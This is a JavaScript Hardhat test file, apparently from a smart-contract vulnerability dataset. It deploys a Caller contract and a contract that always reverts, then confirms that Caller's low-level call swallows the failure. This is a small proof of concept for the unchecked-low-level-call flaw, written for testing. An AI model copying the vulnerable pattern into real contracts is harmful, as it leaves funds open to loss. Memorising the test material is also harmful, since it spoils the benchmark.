const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');

describe("attack unchecked_low_level_calls/0x0cbe050f75bc8f8c2d6c0d249fea125fd6e1acc9.sol", function () {

  async function deployContracts() {
    const Caller = await ethers.getContractFactory("contracts/dataset/unchecked_low_level_calls/0x0cbe050f75bc8f8c2d6c0d249fea125fd6e1acc9.sol:Caller");
    const contract = await Caller.deploy();

    const RevertContract = await ethers.getContractFactory("contracts/unchecked_low_level_calls/revert_contract.sol:RevertContract");
    const revertContract = await RevertContract.deploy();

    return {contract, revertContract}
  };

  it("exploit unchecked low level call vulnerability", async function () {
    const {contract, revertContract} = await loadFixture(deployContracts);

    const [sig] = await ethers.getSigners();
    await expect(
      sig.sendTransaction({
        to: revertContract.target,
        value: ethers.parseEther("1"),
      })
    ).to.be.revertedWith("I always revert!");
    await expect(contract.callAddress(revertContract.target)).to.not.be.reverted;

  });
});
